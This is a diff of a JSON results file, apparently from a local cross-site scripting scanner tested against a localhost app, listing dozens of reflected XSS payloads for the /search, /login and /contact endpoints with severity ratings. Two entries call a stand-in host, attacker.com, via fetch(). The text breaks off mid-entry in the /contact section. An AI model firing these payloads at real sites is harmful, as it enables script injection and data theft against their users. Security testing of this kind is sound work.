@@ -1,362 +1,3418 @@
 [
     {
-        "url": "http://localhost:5000/search",
+        "url": "http://127.0.0.1:5000/search",
         "payload": "<script>alert(1)</script>",
         "method": "get",
-        "type": "Reflected XSS"
+        "type": "Reflected XSS",
+        "severity": "LOW"
     },
     {
-        "url": "http://localhost:5000/search",
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "<script>alert('XSS')</script>",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
         "payload": "<img src=x onerror=alert(1)>",
         "method": "get",
-        "type": "Reflected XSS"
+        "type": "Reflected XSS",
+        "severity": "LOW"
     },
     {
-        "url": "http://localhost:5000/search",
-        "payload": "<svg/onload=alert(1)>",
-        "method": "get",
-        "type": "Reflected XSS"
-    },
-    {
-        "url": "http://localhost:5000/search",
-        "payload": "<body onload=alert(1)>",
-        "method": "get",
-        "type": "Reflected XSS"
-    },
-    {
-        "url": "http://localhost:5000/search",
-        "payload": "\"><script>alert(1)</script>",
-        "method": "get",
-        "type": "Reflected XSS"
-    },
-    {
-        "url": "http://localhost:5000/search",
-        "payload": "'><script>alert(1)</script>",
-        "method": "get",
-        "type": "Reflected XSS"
-    },
-    {
-        "url": "http://localhost:5000/search",
-        "payload": "<iframe src=javascript:alert(1)>",
-        "method": "get",
-        "type": "Reflected XSS"
-    },
-    {
-        "url": "http://localhost:5000/search",
-        "payload": "<details open ontoggle=alert(1)>",
-        "method": "get",
-        "type": "Reflected XSS"
-    },
-    {
-        "url": "http://localhost:5000/search",
-        "payload": "<marquee onstart=alert(1)>",
-        "method": "get",
-        "type": "Reflected XSS"
-    },
-    {
-        "url": "http://localhost:5000/search",
-        "payload": "<video><source onerror=alert(1)>",
-        "method": "get",
-        "type": "Reflected XSS"
-    },
-    {
-        "url": "http://localhost:5000/search",
-        "payload": "<audio src=x onerror=alert(1)>",
-        "method": "get",
-        "type": "Reflected XSS"
-    },
-    {
-        "url": "http://localhost:5000/search",
-        "payload": "<object data=javascript:alert(1)>",
-        "method": "get",
-        "type": "Reflected XSS"
-    },
-    {
-        "url": "http://localhost:5000/search",
-        "payload": "<embed src=javascript:alert(1)>",
-        "method": "get",
-        "type": "Reflected XSS"
-    },
-    {
-        "url": "http://localhost:5000/search",
+        "url": "http://127.0.0.1:5000/search",
         "payload": "<img src=1 onerror=alert(document.domain)>",
         "method": "get",
-        "type": "Reflected XSS"
+        "type": "Reflected XSS",
+        "severity": "LOW"
     },
     {
-        "url": "http://localhost:5000/search",
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "<svg/onload=alert(1)>",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
         "payload": "<svg><script>alert(1)</script></svg>",
         "method": "get",
-        "type": "Reflected XSS"
+        "type": "Reflected XSS",
+        "severity": "LOW"
     },
     {
-        "url": "http://localhost:5000/search",
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "<body onload=alert(1)>",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "\"><script>alert(1)</script>",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "'><script>alert(1)</script>",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "<iframe src=javascript:alert(1)>",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "<details open ontoggle=alert(1)>",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "<marquee onstart=alert(1)>",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "<video><source onerror=alert(1)>",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "<audio src=x onerror=alert(1)>",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "<object data=javascript:alert(1)>",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "<embed src=javascript:alert(1)>",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
         "payload": "<input autofocus onfocus=alert(1)>",
         "method": "get",
-        "type": "Reflected XSS"
+        "type": "Reflected XSS",
+        "severity": "LOW"
     },
     {
-        "url": "http://localhost:5000/search",
+        "url": "http://127.0.0.1:5000/search",
         "payload": "<textarea autofocus onfocus=alert(1)>",
         "method": "get",
-        "type": "Reflected XSS"
+        "type": "Reflected XSS",
+        "severity": "LOW"
     },
     {
-        "url": "http://localhost:5000/search",
+        "url": "http://127.0.0.1:5000/search",
         "payload": "<select autofocus onfocus=alert(1)>",
         "method": "get",
-        "type": "Reflected XSS"
+        "type": "Reflected XSS",
+        "severity": "LOW"
     },
     {
-        "url": "http://localhost:5000/search",
+        "url": "http://127.0.0.1:5000/search",
         "payload": "<keygen autofocus onfocus=alert(1)>",
         "method": "get",
-        "type": "Reflected XSS"
+        "type": "Reflected XSS",
+        "severity": "LOW"
     },
     {
-        "url": "http://localhost:5000/search",
+        "url": "http://127.0.0.1:5000/search",
         "payload": "<math href='javascript:alert(1)'>CLICK</math>",
         "method": "get",
-        "type": "Reflected XSS"
+        "type": "Reflected XSS",
+        "severity": "LOW"
     },
     {
-        "url": "http://localhost:5000/login",
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "<svg><animate onbegin=alert(1) attributeName=x></svg>",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "<img src=# onmouseover=alert(1)>",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "<a href=javascript:alert(1)>CLICK</a>",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "<isindex action=javascript:alert(1)>",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "<form><button formaction=javascript:alert(1)>CLICK</button>",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "<table background='javascript:alert(1)'>",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "<div onpointerover=alert(1)>MOVE</div>",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "<div onmouseenter=alert(1)>TEST</div>",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "<div onclick=alert(1)>CLICK</div>",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "<img dynsrc='javascript:alert(1)'>",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "<img lowsrc='javascript:alert(1)'>",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "<base href='javascript:alert(1);//'>",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "<meta http-equiv='refresh' content='0;javascript:alert(1)'>",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "<style>@import'javascript:alert(1)';</style>",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "<link rel=stylesheet href=javascript:alert(1)>",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "<xml><script>alert(1)</script></xml>",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "<script>confirm(1)</script>",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "<script>prompt(1)</script>",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "<ScRiPt>alert(1)</ScRiPt>",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "%3Cscript%3Ealert(1)%3C/script%3E",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "javascript:alert(1)",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "';alert(1);//",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "\";alert(1);//",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "<img src=x onerror=confirm(1)>",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "<svg/onload=confirm(1)>",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "<script>console.log(1)</script>",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "<script>fetch('http://attacker.com')</script>",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "<iframe srcdoc='<script>alert(1)</script>'>",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "<video onloadstart=alert(1)>",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "<audio onloadstart=alert(1)>",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "<img src=x onerror=prompt(document.domain)>",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "<svg><set onbegin=alert(1) attributeName=x></svg>",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "<button formaction=javascript:alert(1)>CLICK</button>",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "<textarea onfocus=alert(1) autofocus></textarea>",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "<select onfocus=alert(1) autofocus></select>",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "<body onpageshow=alert(1)>",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "<svg><foreignObject><script>alert(1)</script></foreignObject></svg>",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "<img src=x onerror=eval('alert(1)')>",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "<script>setTimeout(alert,1000,1)</script>",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/search",
+        "payload": "<script>setInterval(alert,1000,1)</script>",
+        "method": "get",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
         "payload": "<script>alert(1)</script>",
         "method": "post",
-        "type": "Reflected XSS"
+        "type": "Reflected XSS",
+        "severity": "LOW"
     },
     {
-        "url": "http://localhost:5000/login",
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "<script>alert('XSS')</script>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
         "payload": "<img src=x onerror=alert(1)>",
         "method": "post",
-        "type": "Reflected XSS"
+        "type": "Reflected XSS",
+        "severity": "LOW"
     },
     {
-        "url": "http://localhost:5000/login",
-        "payload": "<svg/onload=alert(1)>",
-        "method": "post",
-        "type": "Reflected XSS"
-    },
-    {
-        "url": "http://localhost:5000/login",
-        "payload": "<body onload=alert(1)>",
-        "method": "post",
-        "type": "Reflected XSS"
-    },
-    {
-        "url": "http://localhost:5000/login",
-        "payload": "\"><script>alert(1)</script>",
-        "method": "post",
-        "type": "Reflected XSS"
-    },
-    {
-        "url": "http://localhost:5000/login",
-        "payload": "'><script>alert(1)</script>",
-        "method": "post",
-        "type": "Reflected XSS"
-    },
-    {
-        "url": "http://localhost:5000/login",
-        "payload": "<iframe src=javascript:alert(1)>",
-        "method": "post",
-        "type": "Reflected XSS"
-    },
-    {
-        "url": "http://localhost:5000/login",
-        "payload": "<details open ontoggle=alert(1)>",
-        "method": "post",
-        "type": "Reflected XSS"
-    },
-    {
-        "url": "http://localhost:5000/login",
-        "payload": "<marquee onstart=alert(1)>",
-        "method": "post",
-        "type": "Reflected XSS"
-    },
-    {
-        "url": "http://localhost:5000/login",
-        "payload": "<video><source onerror=alert(1)>",
-        "method": "post",
-        "type": "Reflected XSS"
-    },
-    {
-        "url": "http://localhost:5000/login",
-        "payload": "<audio src=x onerror=alert(1)>",
-        "method": "post",
-        "type": "Reflected XSS"
-    },
-    {
-        "url": "http://localhost:5000/login",
-        "payload": "<object data=javascript:alert(1)>",
-        "method": "post",
-        "type": "Reflected XSS"
-    },
-    {
-        "url": "http://localhost:5000/login",
-        "payload": "<embed src=javascript:alert(1)>",
-        "method": "post",
-        "type": "Reflected XSS"
-    },
-    {
-        "url": "http://localhost:5000/login",
+        "url": "http://127.0.0.1:5000/login",
         "payload": "<img src=1 onerror=alert(document.domain)>",
         "method": "post",
-        "type": "Reflected XSS"
+        "type": "Reflected XSS",
+        "severity": "LOW"
     },
     {
-        "url": "http://localhost:5000/login",
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "<svg/onload=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
         "payload": "<svg><script>alert(1)</script></svg>",
         "method": "post",
-        "type": "Reflected XSS"
+        "type": "Reflected XSS",
+        "severity": "LOW"
     },
     {
-        "url": "http://localhost:5000/login",
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "<body onload=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "\"><script>alert(1)</script>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "'><script>alert(1)</script>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "<iframe src=javascript:alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "<details open ontoggle=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "<marquee onstart=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "<video><source onerror=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "<audio src=x onerror=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "<object data=javascript:alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "<embed src=javascript:alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
         "payload": "<input autofocus onfocus=alert(1)>",
         "method": "post",
-        "type": "Reflected XSS"
+        "type": "Reflected XSS",
+        "severity": "LOW"
     },
     {
-        "url": "http://localhost:5000/login",
+        "url": "http://127.0.0.1:5000/login",
         "payload": "<textarea autofocus onfocus=alert(1)>",
         "method": "post",
-        "type": "Reflected XSS"
+        "type": "Reflected XSS",
+        "severity": "LOW"
     },
     {
-        "url": "http://localhost:5000/login",
+        "url": "http://127.0.0.1:5000/login",
         "payload": "<select autofocus onfocus=alert(1)>",
         "method": "post",
-        "type": "Reflected XSS"
+        "type": "Reflected XSS",
+        "severity": "LOW"
     },
     {
-        "url": "http://localhost:5000/login",
+        "url": "http://127.0.0.1:5000/login",
         "payload": "<keygen autofocus onfocus=alert(1)>",
         "method": "post",
-        "type": "Reflected XSS"
+        "type": "Reflected XSS",
+        "severity": "LOW"
     },
     {
-        "url": "http://localhost:5000/login",
+        "url": "http://127.0.0.1:5000/login",
         "payload": "<math href='javascript:alert(1)'>CLICK</math>",
         "method": "post",
-        "type": "Reflected XSS"
+        "type": "Reflected XSS",
+        "severity": "LOW"
     },
     {
-        "url": "http://localhost:5000/profile?name=test",
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "<svg><animate onbegin=alert(1) attributeName=x></svg>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "<img src=# onmouseover=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "<a href=javascript:alert(1)>CLICK</a>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "<isindex action=javascript:alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "<form><button formaction=javascript:alert(1)>CLICK</button>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "<table background='javascript:alert(1)'>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "<div onpointerover=alert(1)>MOVE</div>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "<div onmouseenter=alert(1)>TEST</div>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "<div onclick=alert(1)>CLICK</div>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "<img dynsrc='javascript:alert(1)'>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "<img lowsrc='javascript:alert(1)'>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "<base href='javascript:alert(1);//'>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "<meta http-equiv='refresh' content='0;javascript:alert(1)'>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "<style>@import'javascript:alert(1)';</style>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "<link rel=stylesheet href=javascript:alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "<xml><script>alert(1)</script></xml>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "<script>confirm(1)</script>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "<script>prompt(1)</script>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "<ScRiPt>alert(1)</ScRiPt>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "%3Cscript%3Ealert(1)%3C/script%3E",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "javascript:alert(1)",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "';alert(1);//",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "\";alert(1);//",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "<img src=x onerror=confirm(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "<svg/onload=confirm(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "<script>console.log(1)</script>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "<script>fetch('http://attacker.com')</script>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "<iframe srcdoc='<script>alert(1)</script>'>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "<video onloadstart=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "<audio onloadstart=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "<img src=x onerror=prompt(document.domain)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "<svg><set onbegin=alert(1) attributeName=x></svg>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "<button formaction=javascript:alert(1)>CLICK</button>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "<textarea onfocus=alert(1) autofocus></textarea>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "<select onfocus=alert(1) autofocus></select>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "<body onpageshow=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "<svg><foreignObject><script>alert(1)</script></foreignObject></svg>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "<img src=x onerror=eval('alert(1)')>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "<script>setTimeout(alert,1000,1)</script>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/login",
+        "payload": "<script>setInterval(alert,1000,1)</script>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "LOW"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<script>alert(1)</script>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<script>alert('XSS')</script>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<img src=x onerror=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<img src=1 onerror=alert(document.domain)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<svg/onload=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<svg><script>alert(1)</script></svg>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<body onload=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "\"><script>alert(1)</script>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "'><script>alert(1)</script>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<iframe src=javascript:alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<details open ontoggle=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<marquee onstart=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<video><source onerror=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<audio src=x onerror=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<object data=javascript:alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<embed src=javascript:alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<input autofocus onfocus=alert(1)>",
+        "method": "post",
